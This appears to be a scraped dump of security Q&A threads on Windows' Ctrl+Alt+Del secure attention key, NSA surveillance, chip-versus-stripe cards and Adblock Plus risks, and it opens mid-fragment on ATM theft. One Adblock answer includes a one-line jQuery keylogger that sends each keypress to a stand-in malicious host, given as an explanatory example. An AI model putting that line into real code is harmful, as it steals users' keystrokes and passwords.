ATM is likely to be equipped with content-destruction devices (paint sprayers).
You can never know for sure if there's enough money inside just to pay the cost of cutting tools.
QuestionKenntnis:
CTRL+ALT+DEL Login - Rationale behind it?
qn_description:
Maybe a rather noobish question: Why is CTRL+ALT+DEL required at login on Windows systems (I have not seen it elsewhere, but contradict me if I'm wrong) before the password can be typed in? From a usability point of view it's a bad idea, adding an extra step in getting access. So does it improve security in any way, and if so, how?
AnswersKenntnis
AnswerKenntnis:
This combination is called a Secure attention key. The Windows kernel is "wired" to notify Winlogon and nobody else about this combination. In this way, when you press Ctrl+Alt+Del, you can be sure ΓÇá that you're typing your password in the real login form and not some other fake process trying to steal your password. For example, an application which looks exactly like the windows login.
An equivalent of this in Linux is Ctrl+Alt+Pause

ΓÇá This implies a trust in the integrity of the system itself, it's still possible to patch the kernel and override this behaviour for other purposes (malicious or completely legitimate)
AnswerKenntnis:
Ctrl-Alt-Del is the Secure Attention Key on Windows. The operating system enforces a strong non-interception policy for this key combination.

You could make an application which goes full-screen, grabs the keyboard, and displays something which looks like the normal login screen, down to the last pixel. You then log on the machine, launch the application, and go away until some unsuspecting victim finds the machine, tries to log on, and gives his username and password to your application. Your application then just has to simulate a blue screen of death, or maybe to actually log the user on, to complete the illusion.

This attack is defeated by the SAK. Your application can grab the keyboard and redirect all keypresses to itself, without needing administrative rights, except the Ctrl-Alt-Del, which the OS never allows to be redirected. Pressing Ctrl-Alt-Del ensures that you get the genuine logon screen, not an imitation.
AnswerKenntnis:
The answer to this can actually be found on our sister site, ServerFault. How does CTRL-ALT-DEL to log in make Windows more secure?

To quote the accepted answer by Oskar Duveborn,


  The Windows (NT) kernel is designed to reserve the notification of this key combination to a single process: Winlogon. So, as long as the Windows installation itself is working as it should - no third party application can respond to this key combination (if it could, it could present a fake logon window and keylog your password ;)
AnswerKenntnis:
Some additional questions have been raised regarding Windows 8 SAS support, and a later deleted by owner separate question was posted about it, too. Since I've already started writing my answer to that question, and Windows 8 has also been mentioned in this thread, I'm thus posting it here. If that deleted question reappears, I'll move my answer there. Hopefully, it will help those that were wondering where SAS went on Windows 8 phones and tablets.



According to Windows 8 Hardware Certification Requirements as mandated by Microsoft:


  For Windows 8, the SAS signal is sent when the combination of the
  Windows Key button and the Power Button is pressed.


So this is not a case of Secure Attention Key disappearing altogether (on keyboardless devices, others can still use SAS as before), and a combination of two standard hardware buttons Win+Pwr was merely added to the still exisiting Ctrl+Alt+Del combination to better support devices without a hardware keyboard, which is what Windows 8 was also designed for.

Of course, since it's not merely an operating system for portable devices without a physical keyboard, but also desktop computers that wouldn't have these Win+Pwr physical buttons (but they do have a keyboard), the old SAS method was still kept. If, for whatever reasons, you'd like to disable/re-enable this support, this blog (or this) explains how you could achieve that in a few simple steps.



Another related question (or more of a request really) was raised by @Iszi in the Requests for Question of The Week blog posts discussion on IT Security Meta: "I find it especially interesting to discover that Windows & Linux don't necessarily use the same Secure Attention Key. It would be nice if someone could expand a little upon that.". Since I'm already a late-to-the-party bottom feeder on this question here, and nobody can really accuse me of hijacking the rep train [1][2] it turned up to be - well, here it goes:



Main difference between the two implementations that I could find is, that the Linux SAK (yes, this is the acronym used in Linux in contrast to the SAS (Secure Attention Sequence) used in Windows) is that the Linux SAK never earned the National Computer Security Center's (NCSC) C2 security rating. Windows NT has:


  When NT earned its C2 security rating, NCSC also recognized NT as
  meeting two requirements of B-level security: Trusted Path
  functionality and Trusted Facility Management functionality. Trusted
  Path functionality prevents Trojan horse programs from intercepting a
  user's name and password as the user logs on. NT's Trusted Path
  functionality exists in the form of its Ctrl+Alt+Del logon-attention
  sequence. This sequence of keystrokes, the Secure Attention Sequence
  (SAS), causes an NT logon dialog box to pop up, which initializes a
  process that helps NT recognize would-be Trojan horses. NT bypasses
  any Trojan horse that presents a fake logon dialog when a user enters
  the attention sequence.
  
  NT meets the Trusted Facility Management requirement by supporting
  separate account roles for administrative functions. For instance, NT
  provides separate accounts for administration (Administrators), user
  accounts charged with backing up the computer (Backup Operators), and
  standard users (Users). Microsoft is reportedly working on a B-level
  version of NT, but the company has not made a public statement about
  when it might release this version.


But this still doesn't really explain why SAK!=SAS. OK, lets dig a little deeper. From Linux 2.4.2 Secure Attention Key (SAK) handling by Andrew Morton we get the following:


  From the PC keyboard, Linux has two similar but different ways of
  providing SAK.  One is the Alt+SysRq+K sequence.  You shouldn't use
  this sequence.  It is only available if the kernel was compiled with
  sysrq support.
  
  The proper way of generating a SAK is to define the key sequence using
  loadkeys'.  This will work whether or notsysrq` support is compiled
  into the kernel.
  
  SAK works correctly when the keyboard is in raw mode.  This means that
  once defined, SAK will kill a running X server.  If the system is in
  run level 5, the X server will restart.  This is what you want to
  happen.
  
  What key sequence should you use? Well, Ctrl+Alt+Del is used to reboot
  the machine.  Ctrl+Alt+Backspace is magical to the X server.


It goes on explaining how to create a custom SAK handler, but the main takeaway is that the implementation differs greatly from what can be found in Windows as SAS, and that they might not be implemented at the kernel level, depending on what whether sysrq support was enabled for the build.

Does this explain the differences in Windows and Linux handling of SAS/SAK? I would say that it does. User tialaramex from LWN.net explains it neatly:


  Linux has some rudimentary low-level support for this capability but
  it never seems to have ascended into an end user feature of any
  consequence. No application can trap the SAK combination because long
  before any code runs that lets userspace applications fiddle with the
  key presses, the kernel has noticed that the SAK has been pressed and
  short-circuited to a path that just handles this special case.


Whereas:


  In Windows when you press the SAK it forcibly summons a separate
  desktop, which you can think of as being kind of like a separate X
  server process. This desktop is "owned" by the System user, roughly
  equivalent to Unix root, so anyone with permission to tamper with it
  could just have replaced the entire OS kernel or whatever they wanted.


Does it explain why different keyboard sequences were chosen? I'm not sure. It shows why there is more than a single such keyboard sequence in Linux and what the differences between them are (see Andrew Morton's explanation), but I couldn't find a clear answer on why was one chosen over the other and why different kernel builds might use different SAK combinations. I can only suspect that it boils down to personal preference of their respected authors.
AnswerKenntnis:
The idea is that a trusted Windows process called Winlogon, and only Winlogon, can read the Ctrl+Alt+Del key sequence.  This key sequence is called the secure attention sequence (SAS).  By entering this key sequence, you are basically "proving" to yourself that it is Windows that is accepting your input.  This guards against a malicious program intercepting your login credentials by creating a fake username and password form.  Of course, this assumes that Winlogon is not compromised, and it may so happen that Winlogon has been tampered with so that this measure can be bypassed.

If you're presented with a login prompt without being required to press Ctrl+Alt+Del on a system configured to do so, do not enter your login credentials, because this means that a program has highjacked the login prompt.  Either notify the system administrator (if the computer is owned by your company) or clean any malware on the system (if you own the computer).

The same applies with Windows 8, only that there is an additional SAS, Win+Power, for tablets which do not have a physical keyboard (Surface comes to mind).
AnswerKenntnis:
Ctrl+Alt+Del was around way before Windows Logon, originally it simply did a soft reset on the system.  The same combination is on other systems/OSs too (Atari ST springs to mind).

If the question is "why these three keys" then I would say because they are hard to push and a mistake is therefore hard (as people have said).

If the question is "why does Windows (now) use it" then I do not know, maybe because user where familiar with it it was chosen.  You will need to ask the person(s) that made that decision, I am fairly sure the actual keys pressed are arbitrary (but now I am thinking it may be a low level hardware interrupt).
AnswerKenntnis:
Another part of the reason - AFAIK - is to be found when considering the choice of key combination: It is very difficult to press all of Ctrl, Alt and Del at the same time with a single hand; and it is also very unlikely that all 3 keys will be pressed at the same time by something hitting the keyboard, or by you sort of banging on it etc. As David Bradley choose this combination to trigger a soft reboot (Wikipedia), it was important for it not to be triggered by mistake. This caught on for things like bringing up a user login prompt; the idea is to make you demonstrate your intention by explicitly deciding to press an "difficult" key combination (e.g. before logging in).

Of course, that's not about Windows but all PC software and firmware which utilizes Ctrl+Alt+Del.
QuestionKenntnis:
What are the implications of NSA surveillance on the average internet user?
qn_description:
It would appear as though the tinfoil hat-wearing were vindicated today, as news broke of the true scale of the U.S. government's surveillance of its citizens' online activities, conducted primarily through the NSA and seemingly beyond the realm of the law.

If the reports are to be believed, metadata about virtually every aspect of individuals' lives - phone records and geographic data, emails, web application login times and locations, credit card transactions - are being aggregated and subjected to 'big data' analysis. 

The potential for abuse, especially in light of the recent IRS scandal and AP leak investigation, appears unlimited.

Knowing this, what steps can ordinary individuals take to safeguard themselves against the collection, and exposure, of such sensitive personal information?    

I would start with greater adoption of PGP for emails, open source alternatives to web applications, and the use of VPNs. Are there any other (or better) steps that can be taken to minimize one's exposure to the surveillance dragnet?
AnswersKenntnis
AnswerKenntnis:
Foreword: This problem isn't necessarily about governments. At the most general level, it's about online services giving their data about you (willingly or accidentally) to any third party. For the purposes of readability, I'll use the term "government" here, but understand that it could instead be replaced with any institution that a service provider has a compelling reason to cooperate with (or any institution the service could become totally compromised by -- the implications are reasonably similar). The advice below is generalizable to any case in which you want to use an external service while maintaining confidentiality against anyone who may have access to that service's data.

Now, to address the question itself:


  ...what steps can ordinary individuals take to safeguard themselves against the collection, and exposure, of such sensitive personal information?


If you don't want the government of any nation to have access to your data, don't put it on a data-storage service that might possibly collude with a government agency of that nation.

For our model, let's assume that some government has access to your data stored on particular major services at rest (as well as their server logs, possibly). If you're dealing with a service that does storage (Google Drive, email) then SSL will do absolutely nothing to help you: maybe a surveillance effort against you cannot see what you're storing as you're sending it over the wire, but they can see what you've stored once you've stored it.

Presumably, such a government could have access to the same data about you that Google or Microsoft or Apple has. Therefore, the problem of keeping information secret from surveillance reduces to the problem of keeping it secret from the service provider itself (i.e., Google, MS, Apple, etc.). Practically, I might offer the specific tips to reduce your risk of data exposure:


If there's some persistent information (i.e., a document) you don't want some government to see, don't let your service provider see it either. That means either use a service you absolutely trust (i.e., an installation of FengOffice or EtherPad that's running off your SheevaPlug at home (provided you trust the physical security of your home, of course)) or use encryption at rest -- i.e., encrypt your documents with a strong cipher before you send them to Google Drive (I might personally recommend AES, but see the discussion below in the comments).


In fact, this second strategy is exactly how "host-proof" Web applications work (also called "zero-knowledge" applications, but unrelated to the concept of zero-knowledge proofs). The server holds only encrypted data, and the client does encryption and decryption to read and write to the server.

For personal information that you don't need persistent access to, like your search history, you can probably prevent that information from being linked back to you personally by confusing the point of origin for each search using a VPN or onion routing like Tor.


I'm reminded of this xkcd:

:

Once a service has your data, it's impossible to control what that service does with it (or how well that service defends it). If you want control of your data, don't give it away. If you want to keep a secret, don't tell it to anyone. So long as the possibility of surveillance collusion or data compromise against a service is non-trivially high, do not expect your externally-stored data to be private from inspection by any government, even if you had expected that data to be generally private.

A separate question is whether there will be any significant actual impact to the average internet user from such information-gathering programs. It's impossible to say, at least in part because it's impossible to transparently audit the behavior of people involved in a secret information-collection program. In fact, there could be impact from such a program that would be impossible for the general public to recognize as impact from such a program.

In the case of NSA in particular, NSA is chartered to deal with foreign surveillance, so U.S. citizens are not generally targets for analysis, unless perhaps they happen to have a foreign national nearby in their social graph. The NSA publicly makes an effort not to collect information about U.S. citizens (though the degree to which this is followed in practice is impossible to verify, as discussed above).
AnswerKenntnis:
Despite the media hype, the key thing here is not that the FBI/NSA/US Government was intercepting all phone calls, but that it was collecting all phone 'metadata' records which includes:


Originating Phone Number
Terminating Phone NUmber
IMSI Number
IMEI Number
Trunk Identifier (which relates to the location)
Telephone Calling Card numbers
Time of the call
Duration of the call
Location information (possibly)


They can not, however, listen to your phone calls under this order. 

Source: The Guardian, The Guardian, Wired

What can you do about this as an individual? Nothing, technically speaking. This information is not what you're communicating about, but who you're communicating with and from where. This information is not something that you control. The information the alphabet agencies wanted was 'metadata', meaning data that the telco providers generate/store on their own. As part of you using their service (and getting a useful service) this data is created. 

If you are a citizen of the US, you can demand action from your government, support organizations like the EFF who work to protect your privacy and voice your feelings on the matter to your local representatives.

In a related, but older, news article from Germany a couple years ago, a German politician, Malte Spitz, sued to have German telecoms giant Deutsche Telekom hand over six months of his phone data that he then made available here. It's been plotted to a map and allows you to show where he was over the period of 6 months which gives you an idea of what this type of meta data can do.

Regarding PRISM specifically

Prism was a leak of documents detailing interception across a number of large online companies. This leak is separate, but related (as far as I understand) to the one above.


Who is the data (apparently (as this is currently not 100% clear yet)) being collected from?


Microsoft (Lets assume Hotmail/Live/Bing and all other associated MS online services), Google, Yahoo!, Facebook, PalTalk, YouTube, Skype, AOL, Apple.

What is actually being collected by PRISM?


Emails, Chat (voice and video), Videos, photos, stored data, VoIP, File Transfers, Video Conferences, Login metadata, social networking information and 'special requests' (which I assume to mean anything they can think of)

What can I do to avoid my data being collected?


If you are concerned that your communications are being intercepted by this program there are several simple steps you can take.
Don't use any of the above mentioned providers. It's been common knowledge for a while now that emails over 180 days old can be accessed without a warrant, regardless of email provider. Naturally, if you're concerned about such things, encryption is the way to go. 
If you're getting a service for free, you're still paying with something. Usually that something is your meta-data. 'Secure', or at least privacy-friendly, alternatives to all the companies listed above exist and are easily found. For example, duckduckgo.com, PGP, TorMail, TOR, Linux, and Pidgin+OTR all assist in securing your communications (so that even if it is slurped up its unreadable). 



The fact of the matter is this. You can try to always practice 'perfect' security (something which changes as new technologies emerge) but eventually, everyone is human and it's likely you'll mess up (forgetting to connect to a VPN for example). There're so many variables in staying hidden online that covering any specific aspect (like simple web browsing or just sending/receiving emails) is quite a complex task and requires a separate question dedicated in itself.
AnswerKenntnis:
To add to the answer from @RoryAlsop I'd agree that you probably don't, as an average person, have a lot to worry about in terms of the PRISM/phone tapping by the NSA being used for it's intended purprose (anti-terrorism operations by the US gov.) as people's concept of security/privacy most of the time isn't too great.

There are other good reasons to be concerned about this though.  Firstly if you work for a non-US corporate and put information relating to your job on peronsal e-mail /social networking, then could be a risk that the NSA would be able to intercept this and then may pass it to US corporates for commercial advantage.  I have no specific proof that this is happening with PRISM but there have been cases of security agencies providing information to help corporates in the past, so not an unreasonable stretch.

Also I think there's a real risk of scope creep.  Once the power exists and is used for one purpose other government agencies (perhaps less skilled in data analysis and less discerning in it's use) will start making use of the data. For example once the data gathering capabilities exist, if the FBI/CIA asked for the data would they be able to get it, then what about local law enforcement etc.  

EDIT: It also looks like scope creep is already happening with this story talking about how other intelligence agencies including GCHQ have been making use of PRISM

One of the big risks about this kind of data mining (for me) is that someone mines the data and then comes to erroneous conclusions.  For examples mining a list of people who have visited a site and using that as "evidence" of being involved in a crime.  Anyone who knows about the modern Internet can see the problem with that approach, but not all law enforcement personnel have that level of training.

After all that, what can you do about it?  Well the legal piece obviously of supporting the EFF and speaking to legal representatives about it.

Technically as @Dermike says you can look at things like ToR / VPNs for hiding traffic.  A word of warning though is that the use of these services might be seen by government types as "having something to hide", so a bit catch 22 there. Apart from that don't use US based services if you're not in the US.  Whilst there's no specific reason to believe that other governments don't do the same thing, the EU anyway does tend to have more protections for citizens personal information.

Edit Here's a page listing alternatives to products of compaies who were listed as participating in prism.
AnswerKenntnis:
As someone who tracks people and their habits for a living, I will share a few observations about the average user.

Implications of the phone information collection initiative on the internet:

There will be a little more activity online worrying about privacy. The twitterverse will "explode" momentarily, but people will be aware of this as something going on in American government for about a week until it falls out of the mainstream media (where most people get their "news"). Then they'll stop talking about it. Most people who feel they are doing nothing wrong will feel they have nothing to worry about (most people are feeling people). Paranoid people will try to figure out how to hide things and [unknowingly] make themselves look more like people of interest. These are the people who think the government is always watching them, when in actuality the government is looking for patterns of usage that don't stick to the norm (so these people likely do pique interest, but they aren't ever really monitored because outside of a few similarities they will continue to act normally for themselves).

Successful, "Bad" people are much better at blending in with society than these people.

Will it gain anything for the government? Not really other than allowing them to be able to connect a few dots for communications in the past. (The information will be overwhelming.) Politically it will be more damaging (which is what I, myself think this is all about anyhow). If people were doing bad things on throw-away phones chances are (if those people are moderately smart) the phone with the bad-linked IMEI identifiers have been discarded, sold, or donated. It just makes the ignorantly "bad" people realize that they have to be better about their habits.


  Knowing this, what steps can ordinary individuals take to safeguard
  themselves against the collection, and exposure, of such sensitive
  personal information?


Unfortunately statics are not on their side. Most "ordinary individuals" or average people don't have an intellect where they can begin to fathom what is possible with such numbers (identifiers). When they try to research it they can become really good at this one thing (if they have the luxury of focus), but they likely fail elsewhere and most of them are too busy to even worry about it because they have real-world problems going on. To the average American it will be one more thing that focuses on something other than what they feel they need. They'll likely see this as money being spent on something other than the necessities, which for them are going to be things like education, food, and public aid... things that above average (non-ordinary) people take for granted. Things that poor people fear losing because it is unfortunately out of their control.

Ordinary people might notice that there are fewer phone cards on the racks at big box retailers because of the spread of paranoia and because that's where they buy things.

Similar to what Rory Alsop was saying, most people will likely not be able to tell you the difference between their monitor and their computer (if they use a desktop) and they often think of electronic mobile devices as some little bit of magic or mysticism that works in some form or fashion they care not to know about. Or they consider them luxuries, gadgets, or toys. As long as it works, they are not concerned with the technology.

Overall security will increase, knowledgeable people will raise the bar; as always.

If you're in the know, then you likely know that there is nothing that you can do to stop this sort of thing from happening and go about living a normal "good" life. If you want to try and obfuscate all of your communications, or live off of the grid, you may feel more comfortable in mind, but I can tell you this is much harder. People are tracked everywhere they go.

Simple example:

Typical user buys a phone card at a big box retailer. They user their debit card (or some other traceable card). They go home and turn on their computer. They connect to the internet with a non-encrypted connection. They go onto Facebook, Twitter, Yahoo, or countless other sites where they receive numerous tracking cookies. Then they go onto the website where they re-up their phone by punching in the numbers from the card they purchased, or enter the numbers on the phone itself to add more minutes. They may use this phone to connect to their social media profile directly where they have downloaded a tracking app. The phones all have built-in tracking under the guise of "user protection." This phone number is in their public profiles on social media and provided on every marketing survey, job application, and form they complete. They are traceable and fairly consistent (until they lose a job or something of that nature). If they lose their phone (with their "life" on it), they will keep the same phone number. 

How can you not be this person?


Use cash for all technology related purchases.
Do not register your purchase.
Wipe whatever OS is on the device and use an open-source OS as the host platform. Or use an OS like Knoppix if you would like not to leave any traces.
If you must run something like Windows, then run it under a VM. Activate but do not register it.
Prevent all communications with companies that track you. You can do this with firewall rules on a hardware firewall.
You can try to use something like TOR, but remember if they are monitoring your location, they are monitoring the location you are trying to reach because they have already figured out your pattern.
Stop using credit cards.
Stop providing your information freely on the web. (Domain registrations, Social Media, etc)
Stop linking your habits to your person online.
Be unpredictable.
Wipe things that need to be erased. No keeping cracked copies of anything on anything that can't be destroyed with a blow-torch or a lighter.
Think thumbdrives vs hard drives and SSDs.


Or better yet... unplug more often and stop worrying about it. Life is too short for this stuff.
AnswerKenntnis:
@D3C4FF's answer hits the nail squarely on the head, however there is a further viewpoint regarding the average internet user:

The average internet user has no concept of privacy, other than "the government looking at my data is bad, mmmkay"

The average user shares far more information about themselves, deliberately, with the rest of the world than the 3-letter-acronym's used to be able to get using agents. (See this video for a not too far out view of reality)

If the average internet user was actually worried about this stuff, they would not use social networking sites, or a wide range of other sites either - but they aren't. They love to be able to do fun stuff, chat to people, share information etc.

So the implications are pretty much nil 

Now this doesn't hold true for the tinfoil hatters, individuals who may be of high importance, criminals and other niche groups - but they aren't average...
AnswerKenntnis:
It's Always Been an Issue, You Just Didn't Care

I'm not sure you need to worry that much more about it than you should have before. Keep in mind that what they are collecting are your operator's Call Data Records (or at leat a subset of that). You were already trusting a third-party with all that, and that was already a third-party I personally wouldn't have trusted with much of anything. They're mobile operators. They don't give you communications for free, just as Wi-Fi in airports very quickly stopped to be a free commodity, except if provided by shop where they expect you to buy coffee and cake (beware of what you're trusting that shop with as well, by the way, but that's a different topic).

(Note: I worked on developing tools to process call data records and other stuff for some major operators and phone manufacturers. And banks. It's shocking the stuff you'd assume to be done "the right way" and to be "secure" because it god-damn should be, but really isn't...)

Outcomes

Maybe it will push people towards using more secure communication systems. Sure, you can't bypass entirely your telecom operators. Or can you?

Your Data Plan is Your Friend

Users could resort to their data-plan for VoIP instead of using normal communications channels on their phone. Meaning preferring Skype, Google Hangouts, What's App or others over normal voice calls and SMS/MMS.

As long as you trust these to be encrypted in ways that are safe and not reversible, of course. You should prefer an open-source tool which provides more insights on what goes on under the covers, and provides strong encryption...

Decentralized Communications Using Your Phone's Embedded Wireless Technologies

I'm not aware of anything doing that right now (but there might be solutions already), but phones with embedded antennas for Wi-Fi or other wireless techs with decent ranges (or the ability to plug-in an external antenna with USB) could alrady lead up to some pretty interesting ways of communicating that would NOT need to connect to your operator's cell towers.

Think of it this way: with these, your phone can reach any phone that's within the local range of your chosen tech. Which can reach others. If that doesn't remind you of the swarm and DHT systems of some P2P networks...

This has awesome implications as you could have a decentralized communication system that doesn't rely on operators, is essentially anonymous AND secure, and could be used both in "civilized" areas to avoid costs or in "oppressed" areas to avoid censorship and tracking.

Of course, you only go as far as your mobile network would take you, and in remote areas that wouldn't be so great (say, keep your contract if you go trekking in the mountains...). But for the rest, with a few 6.8 billion activated mobile subscribers in 2013 and more coming up, you may be fine and able to reach preeetttyy far if you are in a big city and we set some VPN hubs in-between those...

Now, that would be pretty awesome. But that would take serious effort and community spirit to do without the big hairy hands of the greedy to try to steal the cake (or pass laws to make that illegal). I guess we could even use the same bands as for normal cellphone communications, however I'm pretty sure that's quite illegal, even if done in a non-disruptive manner.

Update 2014-04-02: And then there was OpenGarden's FireChat...



Then again, you'd still need to trust your handset and its OS to not be bugged. Darn.
AnswerKenntnis:
If you want to hide your destination and the content of your communication (and help other people around the world hide theirs too*), have a look at 'The Onion Router' a.k.a. TOR.

It uses (mostly three) proxy-servers of your choice. Each doesn't know which server you want to connect to, but it's next neighbour. Given that not all proxy-servers are controlled by You-Know-Who it's not possible to know where the original request came from at the target. Also its not possible in between to know where your request is targeted at for only the next proxy in your line is known.

But don't take my word for it, see their description at https://www.torproject.org/

*) The more people use it for 'legitimate' surfing, the better people in e.g. Syria can deny they wanted to see forbidden stuff. When only ... say Nazi-propaganda is surfed to from TOR and nothing else, it's easy to tell what you looked at while using it.
QuestionKenntnis:
Why are chips safer than magnetic stripes?
qn_description:
After the recent Target hack there has been talk about moving from credit cards with magnetic stripes to cards with a chip.

In what ways are chips safer than stripes?
AnswersKenntnis
AnswerKenntnis:
You can't clone the chip.

A magnetic strip holds a secret number, and if someone knows that number they can claim to be the owner of the card. But if a bad guy swipes the card, they then know the number, and can make their own card, i.e. "cloning". This has turned out to be a major practical problem with magstripe cards.

A chip also holds a secret number. However, it is securely embedded in the chip. When you use the card, the chip performs a public key operation that proves it knows this secret number. However, it never reveals that secret number. If you put a chipped card in a bad guys machine, they can impersonate you for that one transaction, but they cannot impersonate you in the future.

All of the above assumes that the implementation of the chip is good. Some chips have been known to have implementation flaws that leak the secret code. However, chip and pin is now pretty mature, so I expect most of these issues have been ironed out.
AnswerKenntnis:
The chip carries out a cryptographic operation on data passed to it that requires knowledge of the key that is strongly protected within the chip - so an attacker cannot easily copy the card.

That said, there have been some successful research papers on timing or power attacks, but these are from lab conditions, and probably not a real worry in the wild.

In the UK pretty much all bank cards are chip and pin - which does lead to one of our most common types of fraud: The magstripe is skimmed, and the details used in a country with no chip and pin infrastructure.
AnswerKenntnis:
The magnetic strip contains the exact information used to identify the card.  The chip holds a piece of information that it doesn't share, but that it can use to prove it has that information.

Thus, a magnetic stripe is dumb and can be copied, but since the chip doesn't give out its secret, a vendor can't simply copy it when you use it.

A magnetic stripe says "I'm credit card ABC." when the point of sale asks the number.  With a chip the point of sale says "what is your response to this random value?" and the chip gives a response that the point of sale can validate, but since the next point of sale will use a different random value, the response is useless to a thief.
AnswerKenntnis:
Other answers already given are correct, but I would like to give the following as an answer with no technical background required on part of the person asking:

When you use a magnetic strip Credit Card, the device is saying to the card: "My user will input a PIN to verify, let me read your strip so I can check it".

(
EDIT:

OK, the above paragraph is not what actually happens. But the POS (or other) device reads (or is capable of reading) all the information contained in the strip. That means you can manufacture a card which is for all intents and purposes a copy.
)

When you use a chip Credit Card, the device is saying to the chip on the card: "My user has provided 4567 as the PIN, is it correct?" 

Now, because the chip is smarter than a magnetic strip (which is in effect only a store for data), it can answer this question. This way, the PIN can stay hidden.
AnswerKenntnis:
You might want to clarify your question - here's an answer as to why it's safer card issuer:

If a magstripe card is stolen it's quite easy for the thief to use it fraudulently - how often are signatures really checked (in fact in the US I've often had the card handed back to me before I've signed, even where extra ID isn't requested).

If a chip&pin card is stolen then used fraudulently, the card alone is not sufficient for use - a good thing of course - but that puts the onus on the owner to protect the pin (check the T&Cs).
Say the card was stolen just after the owner used a cashpoint where the thief shoulder-surfed the PIN, then the thief is at least as likely to get away with using the card - and can now withdraw cash rather than just buying goods as a forged signature would allow.

Then of course there's the simple matter of intimidating (or worse) the victim of a theft into handing over the PIN.

Here's a BBC article - we're on chip&pin in the UK -  a quote from near the end


  [The victim's bank], Barclays, returned the ┬ú640 she had lost, but some banks can be
  reluctant to pay refunds if people have been careless with their Pin
  codes.


edit: generalised "bank" to "card issuer"
QuestionKenntnis:
Is Adblock (Plus) a security risk?
qn_description:
My email-provider's website (http://www.gmx.de) recently started linking to the (German) site http://www.browsersicherheit.info/ which basically claims that due to its capabilities to modify a site's appearance, Adblock Plus (and others) might actually be abused for phising. Here's a quote from that site plus its translation:


  Solche Add-ons haben Zugriff auf alle Ihre Eingaben im Browser und k├╢nnen diese auch an Dritte weitergeben ΓÇô auch Ihr Bank-Passwort. Dies kann auf allen Web-Seiten passieren. Sicherheitsmechanismen wie SSL k├╢nnen das nicht verhindern.


translated:


  Such addons can access all your browser's input and can also forward them to third parties - even your banking password. This can happen on all websites. Security mechanisms such as SSL cannot avoid that.


Ok, they mention other (pretty obviously crapware) addons, but is Adblock Plus really a security threat or do that site's operators simply use the opportunity to try and scare inexperienced users into viewing their ads again?
AnswersKenntnis
AnswerKenntnis:
It is not. This is a FUD (fear, uncertainty, and doubt) campaign by GMX because they want to display their ads. There is absolutely no security risk from the mentioned ad blockers. They added some crapware to the list to make it look more legitimate.

Of course such campaigns are very unusual, especially from such a big and well known company like GMX. Unfortunately, I have no English source at hand (because it's a German only campaign) but since you speak German you may want to read this article at heise.de.

Update #1: United Internet, the company behind GMX, received a lot of criticism for misleading customers by falsely claiming that there is a security risk on their PC. The Wall Street Journal (German edition) named the warnings displayed on GMX and the site they link to a "scare campaign".

Update #2: GMX now says that they will no longer display the link when you use ad blockers but will still display it if you use crapware that injects adverts, the list at the site http://www.browsersicherheit.info/ has been updated accordingly and now lists only a small collection of crapware. This list is by no means complete so it is not a reliable source when you want to know if your browser has crapware installed. However, United Internet still maintains it's position that they do not want users who visit their sites to use ad blockers and said they will develop other anti-blocking methods in the future (German source).
AnswerKenntnis:
Yes, it totally is.

Adblock Plus is a browser extension/add-on developed by an independent developer. Adblock can access the DOM (document object model) on all pages.

The way AdBlock works is that it injects script into your browser, which searches the DOM, and then runs a hide() function on what it determines are ads.

That means AdBlock (and any Chrome extension with that permission) can access your DOM. Adblock cannot access JavaScript variables.

What does this mean?

If you are on a website with secure authentication, and there is a JavaScript object with something private like an AuthKey, you are safe. AdBlock cannot access JavaScript variables.

However, AdBlock CAN run code equivalent to this.

$(window).onKeyPress(function(e){$('html').append('<img src='http://mymalicioussite.com/stealData/keyPress.png?key=' + e.keyCode)})

Which essentially will route any keys you press to a remote server.

This can be used to steal your password which is even worse than stealing your token.

That Being Said, Is AdBlock itself Dangerous?

It seems to me that AdBlock is not overly dangerous as the developer has identified himself and it is used by millions of people. If it was doing the kind of trickiness as above, someone would have likely noticed and blown the whistle.

But don't think Chrome Extensions are totally safe. All of them can steal any data, as well as other malicious things. 

What Else Can It Do?

A Chrome Extension can also perform the following security violations quite trivially...


Route the content of any email or page you read to a third-party source (if this email contains unencrypted login information, you are busted) If you can see it on the screen, so can any Chrome Extension, no questions asked.
Enter information into a field and press the submit button, for example, send an e-mail
If you leave your browser open, and the extension knows how, it can use your email interface (Gmail, Outlook) to send e-mail of its choosing to your contacts. This is trivial.
Change the script associated with any button, if that was originally put in with jQuery. For example, the button that sends your sign-in information to the server can be changed slightly to send that information to both the server and http://mymaliciousserver. This is trivial.


Update

It has been verified through discussion that AdBlock is open source. This should let  you trust AdBlock more, but remember it is still capable of doing those things. I've reviewed the source and I can safely say I haven't any idea at all what's going on.

Source: I am a JavaScript and Chrome Extension developer.
AnswerKenntnis:
This really comes down to an issue of trust.  It is true that today, the AdBlock extension is safe.  We know that it will not steal your data, even though—as the other answers point out—it has the technical ability to do so.

However, Chrome extensions are silently and automatically updated.

Do you trust that the developer of the AdBlock extension will not add malicious code?  I personally do – with millions of users, malicious code would be noticed quickly and would undoubtedly be a career killer for the developer.

Even if you do trust the developer, there are still unlikely scenarios that could expose you:


The developer's Chrome Store account could get hacked and the attacker could release a malicious update.
The developer might sell the extension to a less scrupulous party.
Someone might encourage the developer to push malicious code.


For the paranoid, these issues could be mitigated by:


Only logging in to sensitive sites (ie banking) using Incognito mode (where extensions are disabled by default).
Disabling automatic extension updates, but you obviously lose a lot of convenience.


So while it is intellectually dishonest to say, "no, there is no risk," the risk is completely overblown by GMX.  Just as I trust Google to give me a browser that does not steal my personal data, I trust the AdBlock developer to give me an extension that does not steal my data.

The risk of the extension being updated with malicious code is small enough that I don't worry about it, and if I did have the slightest concern, it's easy enough to disable the extension.
AnswerKenntnis:
All software is a security risk, but in this case their claim is misleading. 

Just like all advice is potentially bad and and all transactions are potentially fraudulent. "Risk" just means your security isn't guarenteed, with is true in 100% of cases.

But in the case of AdBlock Plus, the software is well-understood and developed by a team that has a track record of protecting the interests of its users. Plus it's open-source, so the source code is available for you to examine yourself for any security issues. So in this case, the risk is minimal; trivial even.

Instead, GMX is using a truism ("software is always risky") to suggest that this software is dangerous, which is misleading at best, and possibly defamatory. It's like a resturaunt owner handing out leaflets saying his competitors could be poisoning their own food. Technically it's true, since you said "could be" instead of "are", but the action is fundamentally dishonest nonetheless.
AnswerKenntnis:
Just an observation - I tend to promote ad blockers especially for my less savvy friends and associates - precisely because it reduces security threats. How? Because much of the most malicious content on the web comes in the form of a misleading advertisement like "click here to make your pc faster"... These largely disappear with an ad blocker.
AnswerKenntnis:
Adblock (as other extensions and, for that matter, browser developers) has the technical ability to get a lot of your data, and you have all the risks commonly associated with running third-party applications - namely, that the vendor can be malicious, and there may be bugs in their software that break your security.

